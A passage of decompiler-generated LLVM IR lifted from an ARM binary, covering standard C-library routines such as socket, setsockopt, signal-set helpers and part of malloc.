  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_11d68, label %dec_label_pc_11d88, label %dec_label_pc_11d94

dec_label_pc_11d88:                               ; preds = %entry
  store i32 %v3_11d50, i32* @r4, align 4
  store i32 %v12_11d50, i32* @r7, align 4
  store i32 %v15_11d50, i32* @r8, align 4
  store i32 %v18_11d50, i32* %sb.global-to-local, align 4
  %v0_11d90 = call i32 @__sys_sendto()
  br label %dec_label_pc_11d94

dec_label_pc_11d94:                               ; preds = %entry, %dec_label_pc_11d88
  %v0_11d94 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11d94, i32* @r5, align 4
  %v0_11da8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_11da8, i32* @r0, align 4
  %v0_11db0 = call i32 @__sys_sendto()
  store i32 %v0_11db0, i32* @r4, align 4
  %v0_11db8 = load i32, i32* @r5, align 4
  %v1_11dbc = call i32 @__libc_disable_asynccancel(i32 %v0_11db8)
  %v0_11dc0 = load i32, i32* @r4, align 4
  %v2_11dc8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11dc8, i32* @r4, align 4
  store i32 %v6_11d50, i32* @r5, align 4
  store i32 %v9_11d50, i32* @r6, align 4
  store i32 %v12_11d50, i32* @r7, align 4
  store i32 %v15_11d50, i32* @r8, align 4
  store i32 %v18_11d50, i32* @sb, align 4
  store i32 %v21_11d50, i32* @sl, align 4
  store i32 %v24_11d50, i32* @lr, align 4
  ret i32 %v0_11dc0

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11d94, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11dd8 = load i32, i32* @r4, align 4
  store i32 %v3_11dd8, i32* %stack_var_-12, align 4
  %v0_11de8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11de8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11de8, -4095
  br i1 %tmp, label %dec_label_pc_11e10, label %dec_label_pc_11df8

dec_label_pc_11df8:                               ; preds = %entry
  %v0_11dfc = call i32 @__aeabi_read_tp()
  %v3_11e00 = load i16, i16* @global_var_21d68.334, align 2
  %v4_11e00 = sext i16 %v3_11e00 to i32
  store i32 %v4_11e00, i32* @r3, align 4
  %v0_11e04 = load i32, i32* %r2.global-to-local, align 4
  %v1_11e04 = sub i32 0, %v0_11e04
  store i32 %v1_11e04, i32* %r2.global-to-local, align 4
  %v3_11e08 = add i32 %v4_11e00, %v0_11dfc
  %v4_11e08 = inttoptr i32 %v3_11e08 to i32*
  store i32 %v1_11e04, i32* %v4_11e08, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11e10.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11e10

dec_label_pc_11e10:                               ; preds = %entry, %dec_label_pc_11df8
  %v1_11e14 = phi i32 [ %v0_11de8, %entry ], [ -1, %dec_label_pc_11df8 ]
  %v2_11e10 = phi i32 [ %v3_11dd8, %entry ], [ %v2_11e10.pre, %dec_label_pc_11df8 ]
  store i32 %v2_11e10, i32* @r4, align 4
  ret i32 %v1_11e14

; uselistorder directives
  uselistorder i32 %v0_11de8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11e10, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1) local_unnamed_addr {
dec_label_pc_11e18:
  %v0_11e18 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11e18, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11e18
  %v2_11e18 = load i32, i32* @r6, align 4
  %v5_11e18 = udiv i32 %v2_11e18, 4
  %v6_11e18 = and i32 %v5_11e18, %arg1
  %v4_11e1c = mul nuw i32 %v6_11e18, 4
  %v8_11e1c = and i32 %v4_11e1c, %v6_11e18
  call void @__pseudo_branch(i32 %v8_11e1c)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11e18, %bb
  %v9_11e1c = phi i32 [ %arg1, %dec_label_pc_11e18 ], [ %v6_11e18, %bb ]
  ret i32 %v9_11e1c

; uselistorder directives
  uselistorder i32 %v6_11e18, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11e20 = load i32, i32* @r7, align 4
  store i32 %v3_11e20, i32* %stack_var_-8, align 4
  %v0_11e2c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11e2c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11e2c, -4095
  br i1 %tmp, label %dec_label_pc_11e54, label %dec_label_pc_11e3c

dec_label_pc_11e3c:                               ; preds = %entry
  %v0_11e40 = call i32 @__aeabi_read_tp()
  %v3_11e44 = load i16, i16* @global_var_21d68.334, align 2
  %v4_11e44 = sext i16 %v3_11e44 to i32
  store i32 %v4_11e44, i32* @r3, align 4
  %v0_11e48 = load i32, i32* %r2.global-to-local, align 4
  %v1_11e48 = sub i32 0, %v0_11e48
  store i32 %v1_11e48, i32* %r2.global-to-local, align 4
  %v3_11e4c = add i32 %v4_11e44, %v0_11e40
  %v4_11e4c = inttoptr i32 %v3_11e4c to i32*
  store i32 %v1_11e48, i32* %v4_11e4c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11e54.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11e54

dec_label_pc_11e54:                               ; preds = %entry, %dec_label_pc_11e3c
  %v1_11e58 = phi i32 [ %v0_11e2c, %entry ], [ -1, %dec_label_pc_11e3c ]
  %v2_11e54 = phi i32 [ %v3_11e20, %entry ], [ %v2_11e54.pre, %dec_label_pc_11e3c ]
  store i32 %v2_11e54, i32* @r7, align 4
  ret i32 %v1_11e58

; uselistorder directives
  uselistorder i32 %v0_11e2c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11e54, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11e5c:
  %v0_11e5c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11e5c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11e5c
  %v3_11e60 = call i32 @__libc_errno()
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11e5c, %bb
  %v4_11e60 = phi i32 [ %arg1, %dec_label_pc_11e5c ], [ %v3_11e60, %bb ]
  ret i32 %v4_11e60

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_11e7c, label %dec_label_pc_11e74

dec_label_pc_11e74:                               ; preds = %entry
  %v7_11e78 = icmp slt i32 %arg1, 65
  br i1 %v7_11e78, label %dec_label_pc_11e98, label %dec_label_pc_11e7c

dec_label_pc_11e7c:                               ; preds = %dec_label_pc_11e74, %entry
  %v0_11e80 = call i32 @__aeabi_read_tp()
  %v3_11e84 = load i16, i16* @global_var_21d68.334, align 2
  %v4_11e84 = sext i16 %v3_11e84 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_11e90 = add i32 %v4_11e84, %v0_11e80
  %v4_11e90 = inttoptr i32 %v3_11e90 to i32*
  store i32 22, i32* %v4_11e90, align 4
  %v0_11ea0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11ea0

dec_label_pc_11e98:                               ; preds = %dec_label_pc_11e74
  %v0_11e98 = call i32 @__sigaddset()
  store i32 %v0_11e98, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11ea0

dec_label_pc_11ea0:                               ; preds = %dec_label_pc_11e7c, %dec_label_pc_11e98
  %v0_11ea0 = phi i32 [ %v0_11ea0.pre, %dec_label_pc_11e7c ], [ %v0_11e98, %dec_label_pc_11e98 ]
  ret i32 %v0_11ea0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11ea0, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_11ebc = add i32 %tmp, 4
  %v3_11ebc = inttoptr i32 %v2_11ebc to i32*
  store i32 0, i32* %v3_11ebc, align 4
  %v1_11ec0 = load i32, i32* %r3.global-to-local, align 4
  %v2_11ec0 = inttoptr i32 %v1_11ec0 to i32*
  store i32 0, i32* %v2_11ec0, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11ec8 = load i32, i32* @r4, align 4
  store i32 %v3_11ec8, i32* %stack_var_-16, align 4
  %v6_11ec8 = load i32, i32* @r5, align 4
  %v9_11ec8 = load i32, i32* @r6, align 4
  %v7_11ed0 = icmp eq i32 %arg2, -1
  br i1 %v7_11ed0, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_11ed8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_11ef4

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_11efc

dec_label_pc_11ef4:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r6, align 4
  %v7_11ef8 = icmp slt i32 %arg1, 65
  br i1 %v7_11ef8, label %dec_label_pc_11f18, label %dec_label_pc_11efc

dec_label_pc_11efc:                               ; preds = %.thread16, %dec_label_pc_11ef4
  %v0_11f00 = call i32 @__aeabi_read_tp()
  %v3_11f04 = load i16, i16* @global_var_21d68.334, align 2
  %v4_11f04 = sext i16 %v3_11f04 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_11f10 = add i32 %v4_11f04, %v0_11f00
  %v4_11f10 = inttoptr i32 %v3_11f10 to i32*
  store i32 22, i32* %v4_11f10, align 4
  %v0_11f70.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_11f18:                               ; preds = %dec_label_pc_11ef4
  %v2_11f18 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11f18, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_11f20 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11f20, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_11f30 = call i32 @__sigaddset()
  %v0_11f38 = load i32, i32* @r5, align 4
  store i32 %v0_11f38, i32* %r1.global-to-local, align 4
  %v0_11f3c = load i32, i32* @r6, align 4
  %v2_11f3c = add i32 %v0_11f3c, 11880
  %v2_11f40 = call i32 @__GI___sigismember(i32 %v2_11f3c, i32 %v0_11f38)
  store i32 %v2_11f18, i32* %r1.global-to-local, align 4
  %v0_11f54 = load i32, i32* @r5, align 4
  %v3_11f60 = call i32 @__libc_sigaction(i32 %v0_11f54, i32 %v2_11f18, i32 %v2_11ed8)
  %v1_11f64 = icmp slt i32 %v3_11f60, 0
  br i1 %v1_11f64, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_11f18
  %v5_11f68 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_11f68, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_11f18
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_11efc, %bb32
  %v0_11f70 = phi i32 [ %v5_11f68, %bb31 ], [ %v0_11f70.pre, %dec_label_pc_11efc ], [ -1, %bb32 ]
  %v2_11f78 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11f78, i32* @r4, align 4
  store i32 %v6_11ec8, i32* @r5, align 4
  store i32 %v9_11ec8, i32* @r6, align 4
  ret i32 %v0_11f70

; uselistorder directives
  uselistorder i32 %v2_11f18, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11efc, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_11f8c = add i32 %arg2, -1
  %v3_11f90 = udiv i32 %v1_11f8c, 32
  %v4_11f94 = mul nuw nsw i32 %v3_11f90, 4
  %v5_11f94 = add i32 %v4_11f94, %arg1
  %v6_11f94 = inttoptr i32 %v5_11f94 to i32*
  %v7_11f94 = load i32, i32* %v6_11f94, align 4
  %v1_11f98 = urem i32 %v1_11f8c, 32
  %v7_11fa0 = shl i32 1, %v1_11f98
  %v8_11fa0 = and i32 %v7_11f94, %v7_11fa0
  %v10_11fa0 = icmp ne i32 %v8_11fa0, 0
  %. = zext i1 %v10_11fa0 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_11f8c, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_11fb0 = load i32, i32* @r1, align 4
  %v1_11fb0 = add i32 %v0_11fb0, -1
  %v3_11fb4 = udiv i32 %v1_11fb0, 32
  %v0_11fb8 = load i32, i32* @r0, align 4
  %v4_11fb8 = mul nuw nsw i32 %v3_11fb4, 4
  %v5_11fb8 = add i32 %v0_11fb8, %v4_11fb8
  %v6_11fb8 = inttoptr i32 %v5_11fb8 to i32*
  %v7_11fb8 = load i32, i32* %v6_11fb8, align 4
  %v1_11fbc = urem i32 %v1_11fb0, 32
  %v7_11fc4 = shl i32 1, %v1_11fbc
  %v8_11fc4 = or i32 %v7_11fb8, %v7_11fc4
  store i32 %v8_11fc4, i32* %v6_11fb8, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11fb0, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_11fd4 = add i32 %arg2, -1
  %v3_11fd8 = udiv i32 %v1_11fd4, 32
  %v4_11fdc = mul nuw nsw i32 %v3_11fd8, 4
  %v5_11fdc = add i32 %v4_11fdc, %arg1
  %v6_11fdc = inttoptr i32 %v5_11fdc to i32*
  %v7_11fdc = load i32, i32* %v6_11fdc, align 4
  %v1_11fe0 = urem i32 %v1_11fd4, 32
  %tmp = shl i32 -1, %v1_11fe0
  %v8_11fe8 = add i32 %tmp, -1
  %v9_11fe8 = and i32 %v7_11fdc, %v8_11fe8
  store i32 %v9_11fe8, i32* %v6_11fdc, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11fd4, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_11ff8 = udiv i32 %arg1, 256
  store i32 %v3_11ff8, i32* %r1.global-to-local, align 4
  %v2_11ffc = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_11ffc, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_12008 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_11ffc, i32 %v0_12008)
  %v0_1200c = load i32, i32* %r1.global-to-local, align 4
  %v1_1200c = add i32 %v0_1200c, 1048320
  %v3_12010 = udiv i32 %v1_1200c, 65536
  %v1_12014 = and i32 %v3_12010, 8
  %v6_12018 = shl i32 %v0_1200c, %v1_12014
  %v1_1201c = add i32 %v6_12018, 520192
  %v3_12020 = udiv i32 %v1_1201c, 65536
  %v1_12024 = and i32 %v3_12020, 4
  %v6_12028 = shl i32 %v6_12018, %v1_12024
  %v1_1202c = add i32 %v6_12028, 245760
  %v3_12030 = udiv i32 %v1_1202c, 65536
  %v1_12034 = and i32 %v3_12030, 2
  %v6_12038 = shl i32 %v6_12028, %v1_12034
  store i32 %v6_12038, i32* %r1.global-to-local, align 4
  %v1_1203c = sub nsw i32 13, %v1_12014
  %v2_12040 = sub nsw i32 %v1_1203c, %v1_12024
  %v3_12044 = udiv i32 %v6_12038, 32768
  %v4_12044 = sub nuw nsw i32 -1, %v3_12044
  %v4_12048 = udiv i32 %v6_12038, 16384
  %v5_12048 = and i32 %v4_12048, %v4_12044
  %v2_1204c = sub nsw i32 %v2_12040, %v1_12034
  %v2_12050 = add nsw i32 %v2_1204c, %v5_12048
  %v1_12054 = add nsw i32 %v2_12050, 6
  %v0_12058 = load i32, i32* %ip.global-to-local, align 4
  %v6_12058 = lshr i32 %v0_12058, %v1_12054
  %v3_1205c = mul nsw i32 %v2_12050, 4
  %v1_12060 = add nsw i32 %v3_1205c, 32
  %v1_12064 = urem i32 %v6_12058, 4
  %v2_12068 = or i32 %v1_12064, %v1_12060
  ret i32 %v2_12068

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12070 = load i32, i32* @r4, align 4
  %v6_12070 = load i32, i32* @r5, align 4
  %v9_12070 = load i32, i32* @r6, align 4
  %v12_12070 = load i32, i32* @r7, align 4
  %v15_12070 = load i32, i32* @r8, align 4
  %v18_12070 = load i32, i32* @sb, align 4
  %v21_12070 = load i32, i32* @sl, align 4
  %v24_12070 = load i32, i32* @fp, align 4
  %v27_12070 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r1.global-to-local, align 4
  %v4_12084 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 108) to i32*), align 4
  store i32 %v4_12084, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_12090 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 68) to i32*), align 4
  store i32 %v4_12090, i32* %r1.global-to-local, align 4
  %v0_12094 = load i32, i32* @r0, align 4
  store i32 %v0_12094, i32* @r5, align 4
  store i32 %v4_12084, i32* %r2.global-to-local, align 4
  %v2_1209c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1209c, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %ip.global-to-local, align 4
  %v4_120a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 112) to i32*), align 4
  store i32 %v4_120a8, i32* %ip.global-to-local, align 4
  store i32 73908, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_120a8)
  %v0_120b4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_120b4, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r1, align 4
  %v4_120c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 16) to i32*), align 4
  store i32 %v4_120c0, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_120cc.422 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_120c0)
  %v0_120cc = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_120cc, -32
  br i1 %tmp, label %dec_label_pc_120f0, label %dec_label_pc_120d4

dec_label_pc_120d4:                               ; preds = %entry
  store i32 64644, i32* %r2.global-to-local, align 4
  %v0_120d8 = call i32 @__aeabi_read_tp()
  store i32 %v0_120d8, i32* %r0.global-to-local, align 4
  %v3_120dc = load i16, i16* @global_var_21d68.334, align 2
  %v4_120dc = sext i16 %v3_120dc to i32
  store i32 %v4_120dc, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_120e8 = add i32 %v4_120dc, %v0_120d8
  %v4_120e8 = inttoptr i32 %v3_120e8 to i32*
  store i32 12, i32* %v4_120e8, align 4
  br label %dec_label_pc_12974

dec_label_pc_120f0:                               ; preds = %entry
  %v1_120f0 = add i32 %v0_120cc, 11
  store i32 %v1_120f0, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r2.global-to-local, align 4
  %v2_120fc = icmp ugt i32 %v1_120f0, 14
  %v7_120fc = icmp eq i32 %v1_120f0, 15
  %v2_12100 = xor i1 %v7_120fc, true
  %v3_12100 = and i1 %v2_120fc, %v2_12100
  br i1 %v3_12100, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_120f0
  %v5_12100 = and i32 %v1_120f0, -8
  store i32 %v5_12100, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_120f0, %bb
  %v4_12104 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  store i32 %v4_12104, i32* @r0, align 4
  %v1_12108 = inttoptr i32 %v4_12104 to i32*
  %v2_12108 = load i32, i32* %v1_12108, align 4
  store i32 %v2_12108, i32* @r4, align 4
  %v2_1210c = xor i1 %v2_120fc, true
  %v3_1210c = or i1 %v7_120fc, %v2_1210c
  br i1 %v3_1210c, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_12110 = urem i32 %v2_12108, 2
  %v2_12110 = icmp eq i32 %v1_12110, 0
  br i1 %v2_12110, label %dec_label_pc_12118, label %dec_label_pc_12128

dec_label_pc_12118:                               ; preds = %bb143
  %v2_12118 = icmp eq i32 %v2_12108, 0
  br i1 %v2_12118, label %dec_label_pc_12120, label %dec_label_pc_12504

dec_label_pc_12120:                               ; preds = %dec_label_pc_12118
  %v0_12120 = call i32 @__malloc_consolidate()
  store i32 %v0_12120, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12504

dec_label_pc_12128:                               ; preds = %bb143
  %v0_12128 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_12128, %v2_12108
  br i1 %tmp204, label %dec_label_pc_12150, label %dec_label_pc_12130

dec_label_pc_12130:                               ; preds = %dec_label_pc_12128
  %v1_12130 = add i32 %v4_12104, -4
  store i32 %v1_12130, i32* %r1.global-to-local, align 4
  %v3_12134 = udiv i32 %v0_12128, 8
  store i32 %v3_12134, i32* %r2.global-to-local, align 4
  %v4_12138 = mul nuw i32 %v3_12134, 4
  %v5_12138 = add i32 %v4_12138, %v1_12130
  %v6_12138 = inttoptr i32 %v5_12138 to i32*
  %v7_12138 = load i32, i32* %v6_12138, align 4
  store i32 %v7_12138, i32* %r0.global-to-local, align 4
  %v2_1213c = icmp eq i32 %v7_12138, 0
  br i1 %v2_1213c, label %dec_label_pc_12150, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12130
  %v2_12140 = add i32 %v7_12138, 8
  %v3_12140 = inttoptr i32 %v2_12140 to i32*
  %v4_12140 = load i32, i32* %v3_12140, align 4
  store i32 %v4_12140, i32* %r3.global-to-local, align 4
  store i32 %v2_12140, i32* %r0.global-to-local, align 4
  store i32 %v2_12140, i32* %r4.global-to-local, align 4
  store i32 %v4_12140, i32* %v6_12138, align 4
  br label %dec_label_pc_12958

dec_label_pc_12150:                               ; preds = %dec_label_pc_12130, %dec_label_pc_12128
  %tmp205 = icmp ugt i32 %v0_12128, 255
  br i1 %tmp205, label %dec_label_pc_121a0, label %dec_label_pc_12158

dec_label_pc_12158:                               ; preds = %dec_label_pc_12150
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12160 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  %v3_12164 = udiv i32 %v0_12128, 8
  store i32 %v3_12164, i32* @r7, align 4
  %v4_12168 = mul nuw i32 %v3_12164, 8
  %v5_12168 = add i32 %v4_12160, %v4_12168
  store i32 %v5_12168, i32* %r3.global-to-local, align 4
  %v1_1216c = add i32 %v5_12168, 44
  store i32 %v1_1216c, i32* %ip.global-to-local, align 4
  %v1_12170 = add i32 %v5_12168, 56
  %v2_12170 = inttoptr i32 %v1_12170 to i32*
  %v3_12170 = load i32, i32* %v2_12170, align 4
  store i32 %v3_12170, i32* %r0.global-to-local, align 4
  %v9_12174 = icmp eq i32 %v3_12170, %v1_1216c
  br i1 %v9_12174, label %dec_label_pc_12300, label %dec_label_pc_1217c

dec_label_pc_1217c:                               ; preds = %dec_label_pc_12158
  %v2_1217c = add i32 %v3_12170, %v0_12128
  store i32 %v2_1217c, i32* %r3.global-to-local, align 4
  %v1_12180 = add i32 %v2_1217c, 4
  %v2_12180 = inttoptr i32 %v1_12180 to i32*
  %v3_12180 = load i32, i32* %v2_12180, align 4
  store i32 %v3_12180, i32* %r2.global-to-local, align 4
  %v1_12184 = add i32 %v3_12170, 12
  %v2_12184 = inttoptr i32 %v1_12184 to i32*
  %v3_12184 = load i32, i32* %v2_12184, align 4
  store i32 %v3_12184, i32* %r1.global-to-local, align 4
  %v1_12188 = or i32 %v3_12180, 1
  store i32 %v1_12188, i32* %r2.global-to-local, align 4
  %v1_1218c = add i32 %v3_12170, 8
  store i32 %v1_1218c, i32* %r4.global-to-local, align 4
  store i32 %v1_12188, i32* %v2_12180, align 4
  %v0_12194 = load i32, i32* %ip.global-to-local, align 4
  %v1_12194 = load i32, i32* %r1.global-to-local, align 4
  %v2_12194 = add i32 %v1_12194, 8
  %v3_12194 = inttoptr i32 %v2_12194 to i32*
  store i32 %v0_12194, i32* %v3_12194, align 4
  %v0_12198 = load i32, i32* %r1.global-to-local, align 4
  %v1_12198 = load i32, i32* %ip.global-to-local, align 4
  %v2_12198 = add i32 %v1_12198, 12
  %v3_12198 = inttoptr i32 %v2_12198 to i32*
  store i32 %v0_12198, i32* %v3_12198, align 4
  br label %dec_label_pc_12958

dec_label_pc_121a0:                               ; preds = %dec_label_pc_12150
  store i32 %v0_12128, i32* %r0.global-to-local, align 4
  %v1_121a4 = call i32 @__malloc_largebin_index(i32 %v0_12128)
  store i32 %v1_121a4, i32* %r0.global-to-local, align 4
  %v0_121a8 = load i32, i32* @r4, align 4
  %v1_121a8 = and i32 %v0_121a8, 2
  %v2_121a8 = icmp eq i32 %v1_121a8, 0
  store i32 %v1_121a4, i32* @r7, align 4
  br i1 %v2_121a8, label %dec_label_pc_12300, label %dec_label_pc_121b4

dec_label_pc_121b4:                               ; preds = %dec_label_pc_121a0
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r1.global-to-local, align 4
  %v4_121bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  store i32 %v4_121bc, i32* @r0, align 4
  %v0_121c0 = call i32 @__malloc_consolidate()
  store i32 %v0_121c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12300

dec_label_pc_121c8:                               ; preds = %dec_label_pc_12314
  %v1_121c8 = add i32 %v3_12314, 4
  %v2_121c8 = inttoptr i32 %v1_121c8 to i32*
  %v3_121c8 = load i32, i32* %v2_121c8, align 4
  store i32 %v3_121c8, i32* %r3.global-to-local, align 4
  %v0_121cc = load i32, i32* @sl, align 4
  %v1_121d0 = and i32 %v3_121c8, -4
  store i32 %v1_121d0, i32* %r4.global-to-local, align 4
  %v1_121d4 = add i32 %v3_12314, 12
  %v2_121d4 = inttoptr i32 %v1_121d4 to i32*
  %v3_121d4 = load i32, i32* %v2_121d4, align 4
